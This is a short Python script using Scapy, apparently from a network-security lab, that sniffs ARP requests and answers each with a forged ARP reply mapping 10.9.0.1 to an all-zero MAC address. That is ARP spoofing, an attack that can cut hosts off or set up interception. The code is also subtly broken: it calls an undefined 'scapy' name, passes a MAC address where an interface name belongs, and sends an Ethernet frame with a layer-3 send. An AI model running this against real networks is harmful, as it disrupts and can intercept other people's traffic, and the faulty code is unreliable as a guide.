#!/usr/bin/env python3

from scapy.all import *

# this is just a test script, it won't be used in the final version


def spoof_pkt(pkt):

    if pkt["ARP"].op == 1:
        print(pkt.show())
        # spoof = Ether(dst=pkt["Ether"].src, src=get_if_hwaddr('br-b6d58918501d'))/ARP(op=2, psrc="10.9.0.1", hwsrc = "00:00:00:00:00:00", hwdst=pkt["ARP"].hwsrc, pdst=pkt["ARP"].psrc)
        spoof = scapy.Ether(dst=pkt["Ether"].src, src=get_if_hwaddr('ff:ff:ff:ff:ff:ff'))/scapy.ARP(
            op=2, psrc="10.9.0.1", hwsrc="00:00:00:00:00:00", hwdst=pkt["ARP"].hwsrc, pdst=pkt["ARP"].psrc)
        sent = send(spoof, verbose=0)
        print("Sent spoofed ARP reply")


pkt = sniff(filter="arp", prn=spoof_pkt)
